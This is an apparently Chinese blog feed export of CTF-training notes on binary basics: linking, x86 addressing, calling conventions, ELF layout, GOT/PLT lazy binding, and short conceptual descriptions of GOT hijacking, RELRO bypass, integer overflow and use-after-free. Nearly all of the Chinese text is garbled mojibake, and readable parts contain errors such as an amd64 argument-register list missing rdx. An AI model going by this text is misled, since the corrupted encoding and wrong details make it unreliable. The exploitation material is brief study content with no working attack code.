    <content type="text"><![CDATA[[TOC] äºŒè¿›åˆ¶åŸºç¡€ç¨‹åºçš„ç¼–è¯‘ï¼Œæ±‡ç¼–ä¸Žé“¾æŽ¥ç¼–è¯‘ï¼šgcc -Sï¼Œå°†æºä»£ç .cæ–‡ä»¶ç¼–è¯‘æˆ.sçš„æ±‡ç¼–ä»£ç  æ±‡ç¼–ï¼šgcc/asï¼Œå°†.sæ±‡ç¼–ä»£ç æ±‡ç¼–æˆ.oçš„ç›®æ ‡æ–‡ä»¶ é“¾æŽ¥ï¼šgcc/ldï¼Œå°†åº“æ–‡ä»¶libA.a/libB.soä¸Ž.oç›®æ ‡æ–‡ä»¶é“¾æŽ¥æˆå¯æ‰§è¡Œç¨‹åºã€‚åº“æ–‡ä»¶æ˜¯å¯å¤ç”¨çš„ä»£ç (åŒ…æ‹¬å‡½æ•°æˆ–å˜é‡)é›†åˆï¼Œç”¨äºŽå‘å…¶ä»–ç¨‹åºæä¾›ä»£ç ã€‚é™æ€åº“.aä¸­çš„ä»£ç å’Œæ•°æ®ä¼šå®Œæ•´æ‹·è´åˆ°å¯æ‰§è¡Œç¨‹åºä¸­ï¼Œè€ŒåŠ¨æ€åº“.soåˆ™éœ€è¦åœ¨ç¨‹åºè¿è¡Œæ—¶é€šè¿‡åŠ¨æ€é“¾æŽ¥çš„æ–¹å¼åŠ è½½ã€‚ æŒ‡ä»¤æ‰§è¡Œçš„äº”æ­¥è¿‡ç¨‹ï¼šå–æŒ‡ä»¤ï¼ŒæŒ‡ä»¤è¯‘ç ï¼ŒæŒ‡ä»¤æ‰§è¡Œï¼Œè®¿å­˜å–æ•°ï¼Œç»“æžœå†™å›žã€‚(å¹¶ä¸æ˜¯æ¯ä¸ªéƒ½æœ‰äº”æ­¥)ã€‚ æ ˆï¼šä¸€ç§å…ˆè¿›åŽå‡ºçš„æ•°æ®ç»“æž„ï¼Œè¢«ç”¨äºŽå‡½æ•°çš„å±€éƒ¨å†…å­˜ç®¡ç†ï¼šä¿å­˜å±€éƒ¨å˜é‡ï¼Œä¿å­˜å‡½æ•°çš„è°ƒç”¨ä¿¡æ¯ï¼ˆå¦‚è¿”å›žåœ°å€ï¼‰ã€‚æ ˆå¾€ä½Žåœ°å€æ–¹å‘å¢žé•¿ï¼Œespå¯„å­˜å™¨æ°¸è¿œæŒ‡å‘æ ˆé¡¶ã€‚å…¥æ ˆpush esp=esp-4ï¼Œå‡ºæ ˆpop esp=esp+4. X86çš„å¯»å€æ¨¡å¼ï¼š ç«‹å³æ•°å¯»å€ï¼šç«‹å³æ•°åŒ…å«åœ¨æŒ‡ä»¤ä¸­ï¼Œç´§æŽ¥åœ¨æ“ä½œç ä¹‹åŽæˆä¸ºæŒ‡ä»¤çš„ä¸€éƒ¨åˆ†ã€‚ 1mov al,5 å¯„å­˜å™¨å¯»å€ï¼šæ“ä½œæ•°åœ¨å¯„å­˜å™¨ä¸­ï¼ŒæŒ‡ä»¤æŒ‡å®šå¯„å­˜å™¨ã€‚ 1mov axï¼Œbx ç›´æŽ¥å†…å­˜å¯»å€ï¼šæ“ä½œæ•°åœ¨å†…å­˜ä¸­ï¼ŒæŒ‡ä»¤ç›´æŽ¥æŒ‡å®šå†…å­˜åœ°å€ã€‚ 1mov axï¼Œ[2000h] å¯„å­˜å™¨é—´æŽ¥å¯»å€ï¼šæ“ä½œæ•°åœ¨å†…å­˜ä¸­ï¼Œæ“ä½œæ•°çš„åœ°å€åœ¨å¯„å­˜å™¨ä¸­ã€‚ 1mov eaxï¼Œ[ebx] ç´¢å¼•å¯»å€ï¼šé€šè¿‡åŸºå€å¯„å­˜å™¨å†…å®¹åŠ ä¸Šä¸€ä¸ªç´¢å¼•å€¼æ¥å¯»å€å†…å­˜ä¸­çš„æ•°æ®ã€‚ 1mov axï¼Œ[di+200h] ç›¸å¯¹åŸºå€ç´¢å¼•å¯»å€ï¼šç”¨ä¸€ä¸ªåŸºå€å¯„å­˜å™¨åŠ ä¸Šä¸€ä¸ªå˜å€å¯„å­˜å™¨å†åŠ ä¸Šä¸€ä¸ªåç§»é‡æ¥å®Œæˆå†…å­˜å•å…ƒçš„å¯»å€ã€‚ 1mov sh,[bx+si+100h] æ¯”ä¾‹å˜å€å¯»å€ï¼šé€šè¿‡åŸºå€å¯„å­˜å™¨çš„å†…å®¹åŠ ä¸Šå˜å€å¯„å­˜å™¨çš„å†…å®¹ä¸Žä¸€ä¸ªæ¯”ä¾‹å› å­çš„ä¹˜ç§¯æ¥å¯»å€å†…å­˜ä¸­çš„æ•°æ®ã€‚ 1mov eax,[ebx+4*ecx] X86æœºå™¨æŒ‡ä»¤å…¥é—¨popå’Œpushéƒ½å¯ä»¥åˆ†æˆå¯¹æ ˆçš„æ“ä½œå’Œå¯¹æ•°æ®æ“ä½œä¸¤æ¡æŒ‡ä»¤ã€‚ leaï¼šload effective address 123lea &lt;reg32&gt;,&lt;mem&gt;lea eax,[var]å°†åœ°å€varæ”¾å…¥å¯„å­˜å™¨eaxä¸­lea edi,[ebx+4*esi]å³edi=ebx+ 4*esi æŸäº›ç¼–è¯‘å™¨ä¼šä½¿ç”¨leaæ¥è¿›è¡Œç®—æ•°è¿ç®—ï¼Œé€Ÿåº¦æ›´å¿«ã€‚ è°ƒç”¨çº¦å®šå®žçŽ°åº•å±‚çš„è§„èŒƒï¼Œçº¦å®šäº†å‡½æ•°ä¹‹é—´å¦‚ä½•ä¼ é€’å‚æ•°ï¼Œä¸Žæ¬¸çš„é‚£ä¸ªäº†å‡½æ•°å¦‚ä½•ä¼ é€’è¿”å›žå€¼ã€‚ å¸¸è§X86è°ƒç”¨çº¦å®šï¼š Caller Clean-upï¼Œè°ƒç”¨è€…è´Ÿè´£æ¸…ç†æ ˆä¸Šçš„å‚æ•°ï¼šcdeclï¼Œoptlinkã€‚ Callee Clean-upï¼Œè¢«è°ƒè€…è´Ÿè´£æ¸…ç†æ ˆä¸Šçš„å‚æ•°ï¼šstdcallï¼Œfastcallã€‚ å¼€è¾Ÿæ ˆå¸§æ—¶é¢„ç•™æ›´å¤šå­—èŠ‚çš„ç©ºé—´(ä¸€èˆ¬æ˜¯16çš„å€æ•°)ï¼Œæ˜¯ä¸ºäº†å†…å­˜ä¸­çš„å­—èŠ‚å¯¹é½çš„éœ€æ±‚ã€‚ è°ƒç”¨å‡½æ•°åŽæ ˆå¸§çš„å¸ƒå±€è¦ç‰¢è®°ï¼Œè‡ªå·±ç”»ä¸€ä¸‹ã€‚å…³äºŽå­˜æ”¾å±€éƒ¨å˜é‡ä¸Žå‚æ•°çš„é—®é¢˜è®²çš„æŒºè¯¦ç»†ã€‚å¼€è¾Ÿæ ˆå¸§ä¹‹åŽsub 0X10ï¼Œespä¸ºäº†é¢„ç•™ç©ºé—´å­˜æ”¾å±€éƒ¨å˜é‡ï¼Œä¹Ÿå°±æ˜¯åœ¨å‡½æ•°ä¸­å®šä¹‰çš„å˜é‡ã€‚æ­¤æ—¶è°ƒç”¨å‡½æ•°ï¼Œå†ç‰¹åœ°å°†espä¸‹ç§»ï¼Œå­˜æ”¾å‚æ•°ï¼Œå‚æ•°å¯ä»¥ç”¨ebp+xxçš„åç§»é‡è¡¨ç¤ºã€‚æ‰€ä»¥ä¼šå­˜åœ¨ä¸­é—´æœ‰unused dwordçš„æƒ…å†µã€‚ cdeclåœ¨è°ƒç”¨è€…çš„ä»£ç ä¸­ä¼šæœ‰add 0xxxï¼Œespçš„æ“ä½œï¼Œå®žé™…å°±æ˜¯åœ¨æ¸…ç†æ ˆä¸Šçš„å‚æ•°ã€‚ leaveï¼šç”¨äºŽæ¸…ç†çš„æŒ‡ä»¤ã€‚ 12mov esp,ebp//push ebppop ebp//mov ebpï¼Œespï¼Œç„¶åŽå†å¼€è¾Ÿæ ˆå¸§ã€‚ é€šè¿‡ebpæ¢å¤esp X86(32ä½)cdeclè°ƒç”¨çº¦å®šï¼šç”¨æ ˆä¼ é€’å‚æ•°ï¼Œç”¨å¯„å­˜å™¨eaxæ¥ä¿å­˜è¿”å›žå€¼ã€‚ amd64(64ä½)cdeclè°ƒç”¨çº¦å®šï¼šä½¿ç”¨å¯„å­˜å™¨rdiï¼Œrsiï¼Œrcxï¼Œr8ï¼Œr9æ¥ä¼ é€’å‰å…­ä¸ªå‚æ•°ï¼Œç¬¬ä¸ƒä¸ªåŠä»¥ä¸Šçš„å‚æ•°é€šè¿‡æ ˆæ¥ä¼ é€’ã€‚ æ ˆå¸§æŒ‡é’ˆebp/rbpç”¨é€”ï¼šç´¢å¼•æ ˆä¸Šçš„å‚æ•°ï¼Œä¿å­˜æ ˆé¡¶ä½ç½®ã€‚ ä¸Šä¸€å±‚æ ˆå¸§æŒ‡é’ˆ å‚æ•°arguments è¿”å›žåœ°å€return address ä¿å­˜çš„æ ˆå¸§æŒ‡é’ˆ è¢«è°ƒè€…ä¿å­˜çš„å¯„å­˜å™¨ â†ebp å±€éƒ¨å˜é‡ â†esp Linux x86è¿›ç¨‹å†…å­˜ç©ºé—´å¸ƒå±€ï¼š å†…æ ¸ 0xFFFFFFFF æ ˆ 0xc0000000 â†“ å…±äº«åº“Shared Library â†‘ 0x40000000 å †Heap æ•°æ®Data ä»£ç Text 0x08048000 Unused 0x00000000 å³è¾¹çš„åœ°å€è¡¨ç¤ºå·¦è¾¹çš„å—ç»“æŸçš„åœ°å€ã€‚ é«˜åœ°å€ä¸ºå†…æ ¸åŒºåŸŸï¼Œç”¨æˆ·æ— æƒè®¿é—®ï¼Œä½Žåœ°å€ä¸ºç”¨æˆ·åŒºåŸŸï¼Œåœ¨å†…æ ¸æ²¡æœ‰å¼€å¯SMAPæ—¶ï¼Œå†…æ ¸ä»£ç å¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´æ•°æ®ï¼Œåœ¨å†…æ ¸æ²¡æœ‰å¼€å¯SMEPä¿æŠ¤æ—¶ï¼Œå†…æ ¸æ€å¯ä»¥æ‰§è¡Œç”¨æˆ·åŒºåŸŸä»£ç ã€‚ ä¸åŒè¿›ç¨‹è™½ç„¶çœ‹åˆ°çš„éƒ½æ˜¯08048000ï¼Œä½†æ˜¯å®žé™…çš„ç‰©ç†åœ°å€æ˜¯ä¸ä¸€æ ·çš„ï¼Œåªæ˜¯æ“ä½œç³»ç»Ÿå°†å…¶ç»Ÿä¸€äº†ã€‚ ELFä¸ŽåŠ¨æ€é“¾æŽ¥ELFæ–‡ä»¶æ ¼å¼Executable and Linkable Formatï¼Œä¸€ç§Linuxä¸‹å¸¸ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯¹è±¡ï¼Œå…±äº«åº“çš„æ ‡å‡†æ–‡ä»¶æ ¼å¼ã€‚è¿˜æœ‰å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼PE,Mach-Oï¼ŒCOFFï¼ŒCOMã€‚å†…æ ¸ä¸­å¤„ç†ELFç›¸å…³ä»£ç å‚è€ƒfs/binfmt_elf.cã€‚ELFä¸­çš„æ•°æ®æŒ‰ç…§Segmentå’ŒSectionä¸¤ä¸ªæ¦‚å¿µåˆ’åˆ†ã€‚ Segmentç”¨äºŽå‘Šè¯‰å†…æ ¸ï¼Œåœ¨æ‰§è¡ŒELFæ–‡ä»¶æ—¶åº”è¯¥å¦‚ä½•æ˜ å°„å†…å­˜ã€‚æ¯ä¸ªSegmentä¸»è¦åŒ…å«åŠ è½½åœ°å€ï¼Œæ–‡ä»¶ä¸­çš„èŒƒå›´ï¼Œå†…å­˜æƒé™ï¼Œå¯¹é½æ–¹å¼ç­‰ä¿¡æ¯ï¼Œæ˜¯è¿è¡Œæ—¶å¿…é¡»æä¾›çš„ä¿¡æ¯ã€‚ Sectionç”¨äºŽå‘Šè¯‰è¿žæŽ¥å™¨ELFä¸­æ¯ä¸ªéƒ¨åˆ†æ˜¯ä»€ä¹ˆï¼Œå“ªé‡Œæ˜¯ä»£ç ï¼Œå“ªé‡Œæ˜¯åªè¯»æ•°æ®ï¼Œå“ªé‡Œæ˜¯é‡å®šä½ä¿¡æ¯ã€‚åœ¨æ–‡ä»¶çš„æ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰ã€‚æ¯ä¸ªSectionä¸»è¦åŒ…å«Sectionç±»åž‹ï¼Œæ–‡ä»¶ä¸­çš„ä½ç½®ï¼Œå¤§å°ç­‰ä¿¡æ¯ã€‚é“¾æŽ¥å™¨ä¾èµ–Sectionå°†ä¸åŒçš„å¯¹è±¡æ–‡ä»¶çš„ä»£ç ï¼Œæ•°æ®ä¿¡æ¯åˆå¹¶ï¼Œå¹¶ä¿®å¤å¼•ç”¨ã€‚ segmentä¸Žsegmentçš„å…³ç³»ï¼šç›¸åŒæƒé™çš„Sectionä¼šæ”¾å…¥åŒä¸€ä¸ªSegmentï¼Œä¾‹å¦‚.textå’Œ.rodata setionï¼ˆéƒ½æ˜¯åªè¯»ï¼‰ã€‚ä¸€ä¸ªSegmentåŒ…å«è®¸å¤šSectionï¼Œä¸€ä¸ªSectionå¯ä»¥å±žäºŽå¤šä¸ªSegmentï¼ˆä»¥4KBä¸ºå•ä½ä¸€é¡µä¸€é¡µæ˜ å°„ï¼Œä¼šæ˜ å°„è¿‡å¤šçš„sectionï¼‰ã€‚ ELFæ–‡ä»¶ç±»åž‹ï¼š å¯æ‰§è¡Œæ–‡ä»¶ET_EXEC,å¯ç›´æŽ¥è¿è¡Œçš„ç¨‹åºï¼Œå¿…é¡»åŒ…å«segmentã€‚ å¯¹è±¡æ–‡ä»¶ET_REL,*.oï¼Œéœ€è¦ä¸Žå…¶ä»–å¯¹è±¡æ–‡ä»¶é“¾æŽ¥ï¼Œå¿…é¡»åŒ…å«sectionã€‚ åŠ¨æ€åº“ET_DYN,*,soï¼Œä¸Žå…¶ä»–å¯¹è±¡æ–‡ä»¶/å¯æ‰§è¡Œæ–‡ä»¶é“¾æŽ¥ï¼Œå¿…é¡»åŒæ—¶åŒ…å«segmentä¸Žsectionã€‚ ELF header Program header table .text åªè¯» .rodata åªè¯» â€¦ å¯è¯»å†™ .data å¯è¯»å†™ Section header table ELF HeaderåŒ…å«æž¶æž„ï¼ŒABIç‰ˆæœ¬(åŒ…å«è°ƒç”¨çº¦å®š)ç­‰åŸºç¡€ä¿¡æ¯,ä»¥åŠprogram header tableçš„ä½ç½®å’Œæ•°é‡ï¼Œsection header tableçš„ä½ç½®å’Œæ•°é‡ã€‚ Program header tableä¸­æ¯ä¸ªè¡¨é¡¹å®šä¹‰äº†ä¸€ä¸ªsegmentï¼Œæ¯ä¸ªsegmentå¯åŒ…å«å¤šä¸ªsectionã€‚ Setion header tableä¸­æ¯ä¸ªè¡¨é¡¹å®šä¹‰ä¸€ä¸ªsectionã€‚ åŠ¨æ€é“¾æŽ¥ä¸Žå»¶è¿Ÿç»‘å®šåŠ¨æ€é“¾æŽ¥**ï¼šä¸€ç§è¿è¡Œæ—¶æ‰ä¼šåŠ è½½å’Œé“¾æŽ¥ç¨‹åºæ‰€ä¾èµ–çš„å…±äº«åº“çš„æŠ€æœ¯ï¼ŒLinuxæœ€å¸¸è§çš„å…±äº«åº“æ˜¯libcã€‚ é‡å®šä½(Relocations)ï¼šæŒ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å¾…å¡«å……é¡¹ï¼Œåœ¨ç¨‹åºè¿è¡Œä¹‹åŽé‡æ–°å¡«å……çš„è¿‡ç¨‹ã€‚é™æ€é“¾æŽ¥ä¸­ï¼Œé“¾æŽ¥å™¨åœ¨é“¾æŽ¥æ—¶å¡«å……ï¼Œä¾‹å¦‚é“¾æŽ¥å¤šä¸ªç›®æ ‡æ–‡ä»¶çš„æ—¶å€™ï¼Œä¿®æ­£ç›¸äº’å¼•ç”¨çš„å‡½æ•°ï¼Œå˜é‡åœ°å€ã€‚è€ŒåŠ¨æ€é“¾æŽ¥ä¸­åœ¨è¿è¡Œæ—¶å¡«å……ã€‚ å»¶è¿Ÿç»‘å®šï¼šå¤–éƒ¨å‡½æ•°çš„åœ°å€åœ¨è¿è¡Œæ—¶æ‰ä¼šç¡®å®šï¼Œå¤–éƒ¨å‡½æ•°ç¬¦å·åœ¨é¦–æ¬¡è°ƒç”¨æ—¶æ‰ä¼šè¢«è§£æžï¼ˆå¤–éƒ¨å˜é‡ä¸ä½¿ç”¨å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼‰ã€‚ GOTè¡¨(Global Offset Table)ï¼šç”¨äºŽå­˜æ”¾å¤–éƒ¨åº“å‡½æ•°åœ°å€ã€‚åˆå§‹çŠ¶æ€æŒ‡å‘ä¸€æ®µä»£ç (PLT,è¿‡ç¨‹é“¾æŽ¥è¡¨ï¼ŒProcedure Linkage Table)ã€‚å½“åº“å‡½æ•°é¦–æ¬¡è°ƒç”¨ï¼ŒçœŸæ­£çš„å‡½æ•°åœ°å€ä¼šè¢«è§£æžå¹¶å¡«å…¥ç›¸åº”çš„GOTè¡¨é¡¹ã€‚æ¯ä¸ªå¤–éƒ¨å‡½æ•°å‡æœ‰ä¸€æ®µPLTä»£ç ï¼Œç”¨äºŽè·³è½¬åˆ°å“åº”GOTè¡¨é¡¹ä¸­å­˜å‚¨çš„åœ°å€ã€‚ ä¾‹å¦‚è°ƒç”¨putså‡½æ•°ï¼Œä»Žgdbä¸­çœ‹æ˜¯ï¼š 12345678call 0X80482e0 &lt;puts@plt&gt;0x80482e0 &lt;puts@plt&gt;:jmp *0x804a00c(è·³è½¬åˆ°putså¯¹åº”çš„GOTè¡¨é¡¹ï¼Œåˆå§‹çŠ¶æ€æŒ‡å‘puts@plt+6)0x80482e6 &lt;puts@plt+6&gt;:push $0x0ï¼ˆä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°0ï¼‰0x80482eb &lt;puts@plt+11&gt;:jmp 0x80482d0ï¼ˆè·³è½¬åˆ°0x80482d0ï¼Œè¿™ç§åœ°å€ä¸€èˆ¬ç§°ä¸ºPLT0ï¼‰0x80482d0ï¼špush 0x804a004ï¼ˆä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°0x804a004ï¼Œæ­¤å¤„å­˜çš„æ˜¯Link_mapï¼‰0x80482d6ï¼šjmp *0x804a008ï¼ˆè·³è½¬åˆ°*0x8048008ï¼Œ_dl_runtime_resolve) ä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€æ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°æ—¶ï¼Œæ‰§è¡ŒPLTä»£ç ç¬¬ä¸€è¡Œè·³è½¬åˆ°ç¬¬äºŒè¡Œï¼Œç¬¬äºŒè¡Œä¼ å‚åŽæ‰§è¡Œç¬¬ä¸‰è¡Œä¼ å‚Link_mapï¼ŒåŽç»§ç»­è·³è½¬æ‰§è¡Œ_dl_runtime_resolve(è¿è¡Œæ—¶è§£æžï¼Œä¸€ä¸ªç”¨æ¥è§£æžåŠ¨æ€é“¾æŽ¥å‡½æ•°çš„å‡½æ•°)ï¼Œæ‰§è¡Œå®ŒåŽGOTè¡¨ä¸­å°±ä¼šæœ‰æ­£ç¡®çš„å‡½æ•°è¿è¡Œåœ°å€ï¼Œè€ŒåŽé¢è°ƒç”¨æ—¶å°±æ— éœ€è·³è½¬ã€‚ .got Sectionä¸­å­˜æ”¾å¤–éƒ¨å…¨å±€å˜é‡çš„GOTè¡¨ï¼Œéžå»¶è¿Ÿç»‘å®šã€‚ .got.plt Sectionä¸­å­˜æ”¾å¤–éƒ¨å‡½æ•°çš„GOTè¡¨ï¼Œé‡‡ç”¨å»¶è¿Ÿç»‘å®šã€‚ .got.pltï¼ˆè§£æžå‰ï¼‰ .got.pltï¼ˆè§£æžåŽï¼‰ .dunamic.sectionåœ°å€ .dunamic.sectionåœ°å€ link_mapåœ°å€ link_mapåœ°å€ _dl_runtime_resloveåœ°å€ _dl_runtime_resloveåœ°å€ puts@plt+6 puts .got.pltå‰ä¸‰é¡¹æœ‰ç‰¹æ®Šå«ä¹‰ï¼š .dynamic section,ä¸ºåŠ¨æ€é“¾æŽ¥æä¾›ä¿¡æ¯ã€‚ link_mapï¼Œä¸€ä¸ªé“¾è¡¨ï¼ŒåŒ…å«æ‰€æœ‰åŠ è½½çš„å…±äº«åº“ä¿¡æ¯ã€‚ _run_time_reslove,ä½äºŽloaderä¸­ï¼Œç”¨äºŽè§£æžå¤–éƒ¨å‡½æ•°ç¬¦å·çš„å‡½æ•°ã€‚è§£æžå®Œæˆä¹‹åŽä¼šç›´æŽ¥æ‰§è¡Œè¯¥å‡½æ•°ã€‚ ä»Žå…¨å±€ä¸­çœ‹ï¼Œ.got.pltæ˜¯sectionsçš„ä¸€éƒ¨åˆ†ï¼š .dynamic .got .got.plt .data å…¶ä¸­çš„.got.pltç»†åˆ†ä¸ºï¼š .dynamic sectionåœ°å€ link_mapåœ°å€ _dl_runtime_resloveåœ°å€ (ä»Žç¬¬å››é¡¹å¼€å§‹å°±æ˜¯å¤–éƒ¨å‡½æ•°çš„GOTè¡¨é¡¹) .plt Sectionä¸­å­˜æ”¾æ‰€æœ‰å¤–éƒ¨å‡½æ•°çš„pltè¡¨é¡¹ã€‚ GOTè¡¨åŠ«æŒæ”»å‡»å»¶è¿Ÿç»‘å®šæœºåˆ¶è¦æ±‚GOTè¡¨å¿…é¡»å¯å†™ï¼Œå†…å­˜æ³„éœ²å¯å¯¼è‡´GOTè¡¨é¡¹è¢«æ”¹å†™ï¼Œä»Žè€ŒåŠ«æŒPCã€‚ é˜²å¾¡GOTè¡¨åŠ«æŒï¼šé‡å®šä½åªè¯»ç¼“è§£æŽªæ–½,åœ¨ç¼–è¯‘æ—¶åŠ å…¥ä»¥ä¸‹å‚æ•° 1gcc-z,relro åŽŸç†ï¼šåœ¨è¿›å…¥main()ä¹‹å‰ï¼Œæ‰€æœ‰çš„å¤–éƒ¨å‡½æ•°éƒ½ä¼šè¢«è§£æžã€‚æ‰€æœ‰GOTè¡¨è®¾ç½®ä¸ºåªè¯»ã€‚ ç»•è¿‡æ–¹æ³•ï¼šåŠ«æŒä¸ºå¼€å¯è¯¥ä¿æŠ¤çš„åŠ¨æ€åº“ä¸­çš„GOTè¡¨/æ”¹å†™å‡½æ•°è¿”å›žåœ°å€æˆ–è€…å‡½æ•°æŒ‡é’ˆã€‚ IO2BOï¼Œåˆ©ç”¨å¯¹signedå’Œunsignedçš„è¿‡æ»¤ä¸å……åˆ†ï¼Œç”¨è´Ÿæ•°äº§ç”Ÿæº¢å‡ºã€‚ æ•°ç»„ä¸‹æ ‡è¶Šç•Œ 123if (index&lt;arr_size)&#123; arr[index]=value&#125; å½“indexä¸ºè´Ÿæ•°ï¼Œå³å¯ç»•è¿‡æ¡ä»¶indeex&lt;arr_sizeï¼Œåœ¨æ•°ç»„å†™å…¥æ—¶å¯äº§ç”Ÿè¶Šç•Œã€‚ ç±»åž‹è½¬æ¢å¯¼è‡´æ•´æ•°æº¢å‡ºã€‚ é‡Šæ”¾åŽåˆ©ç”¨UAFç»“æž„/å¯¹è±¡åœ¨é‡Šæ”¾ï¼ˆfree/deleteï¼‰åŽï¼Œå…¶å¼•ç”¨ä¾ç„¶è¢«é”™è¯¯åœ°ä½¿ç”¨ï¼Œç§°ä¸ºé‡Šæ”¾åŽåˆ©ç”¨ã€‚è¯¥åˆ©ç”¨é‡‡ç”¨ä»£ç å®¡è®¡/é€†å‘åˆ†æžçš„æ–¹æ³•ç”¨è‚‰çœ¼æ‰¾å¯¹æ°´å¹³è¦æ±‚éžå¸¸é«˜ï¼Œç›®å‰å¤§éƒ¨åˆ†UAFéƒ½æ˜¯é€šè¿‡æ¨¡ç³Šæµ‹è¯•å‘çŽ°ã€‚ä¿®å¤ï¼šè¦å¯¹é‡Šæ”¾çš„å¯¹è±¡/ç»“æž„åŠæ—¶ç½®ç©ºæŒ‡é’ˆã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[GOTè¡¨å’ŒPLTè¡¨çŸ¥è¯†è¯¦è§£]]></title>
    <url>%2F2020%2F04%2F13%2FGOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[ä»Šå¤©å¬äº†å¯ä»¥è¯´æ˜¯å®‰å…¨ä¹‹è·¯çš„å¯è’™å¤§ä½¬çš„CTFåŸ¹è®­(é«˜ä¸­çœ‹äº†ä¸€ç¯‡å†™æ¸…åŽè“èŽ²èŠ±å’ŒDEF CONé»‘å®¢å¤§ä¼šçš„å¾®ä¿¡æ–‡ç« ï¼Œæ‰“å¼€äº†ç½‘ç»œå®‰å…¨çš„å¤§é—¨)ã€‚å°è±¡æ¯”è¾ƒæ·±çš„å°±æ˜¯GOTè¡¨å’ŒPLTè¡¨çš„ç›¸å…³æŠ€æœ¯ï¼Œç”¨ä¸€ä¸ªåŠ¨æ€çš„è¿‡ç¨‹å±•çŽ°äº†å‡ºæ¥ï¼Œå®žåœ¨æ˜¯æœ‰ç§è¦åˆ°ç—…é™¤çš„æ„Ÿè§‰ã€‚åŽé¢è®²å¸¸è§çš„segementä¸ŽsectionåŒºåˆ«ï¼ŒäºŒè¿›åˆ¶æ¼æ´žï¼Œæ ˆæº¢å‡ºï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ•´æ•°æº¢å‡ºï¼ˆè”æƒ³åˆ°äº†-1å°è±¡æ¯”è¾ƒæ·±ï¼‰ã€‚æ„Ÿè§‰æŒºå¯æƒœçš„ï¼Œæœ‰äº›å¾ˆå¥½çš„æ€»ç»“éƒ½æ²¡æœ‰æˆªå›¾ä¸‹æ¥è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„åŠ è½½å•¥çš„ã€‚ å½“.textä»£ç æ®µä¸­è°ƒç”¨äº†ä¸€ä¸ªä½äºŽglibcåŠ¨æ€åº“å†…çš„å‡½æ•°æ—¶ï¼Œç¼–è¯‘å’Œé“¾æŽ¥é˜¶æ®µï¼Œé“¾æŽ¥å™¨æ— æ³•çŸ¥é“è¿›ç¨‹è¿è¡Œä¹‹åŽè¯¥å‡½æ•°çš„åŠ è½½åœ°å€ï¼Œæ‰€ä»¥åœ¨call è¯¥å‡½æ•°åœ°å€æ—¶ï¼Œå‡½æ•°åœ°å€æ˜¯ç©ºçš„ã€‚åªæœ‰è¿›ç¨‹è¿è¡Œä¹‹åŽï¼Œè¯¥å‡½æ•°åœ°å€æ‰èƒ½ç¡®å®šã€‚ å½“è¿›ç¨‹è¿è¡Œä¹‹åŽï¼Œglibcè£…è½½äº†ï¼Œå‡½æ•°åœ°å€ç¡®å®šäº†ï¼Œå¦‚ä½•ä¿®æ”¹(é‡å®šä½)ï¼Ÿç”±äºŽçŽ°ä»£æ“ä½œç³»ç»Ÿä¸å…è®¸ç›´æŽ¥ä¿®æ”¹ä»£ç æ®µï¼Œåªèƒ½ä¿®æ”¹æ•°æ®æ®µï¼Œå¹¶ä¸”å¦‚æžœè°ƒç”¨è¯¥å‡½æ•°çš„å‡½æ•°æ˜¯åœ¨ä¸€ä¸ªåŠ¨æ€åº“.soæ–‡ä»¶é‡Œï¼Œé‚£ä¹ˆå°±æ— æ³•åšåˆ°ç³»ç»Ÿå†…æ‰€æœ‰è¿›ç¨‹å…±äº«ä¸€ä¸ªåŠ¨æ€åº“ã€‚å› æ­¤å‡½æ•°åœ°å€åªèƒ½å›žå†™åˆ°æ•°æ®æ®µå†…ï¼Œè€Œä¸èƒ½å›žå†™åˆ°ä»£ç æ®µä¸Šã€‚ æˆ‘ä»¬æŠŠèŽ·å–æ•°æ®æ®µå­˜æ”¾å‡½æ•°åœ°å€çš„é‚£ä¸€å°æ®µä»£ç ç§°ä¸ºPLTï¼ˆProcedure Linkage Tableï¼‰è¿‡ç¨‹é“¾æŽ¥è¡¨ï¼Œå­˜æ”¾å‡½æ•°åœ°å€çš„æ•°æ®æ®µç§°ä¸ºGOTï¼ˆGlobal Offset Tableï¼‰å…¨å±€åç§»è¡¨ã€‚PLTè¡¨ä¸­çš„æ•°æ®å°±æ˜¯GOTè¡¨ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€å®šæ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚ è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå…ˆcall &lt; name@plt &gt;ï¼Œname@pltå³ä¸ºè¿™ä¸ªè¡¨ä¸­æ•°æ®çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯GOTè¡¨çš„åœ°å€ã€‚GOTè¡¨çš„åœ°å€ä¼šç”±_dl_runtime_resolveé‡å†™ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[DES]]></title>
    <url>%2F2020%2F04%2F07%2FDES%2F</url>
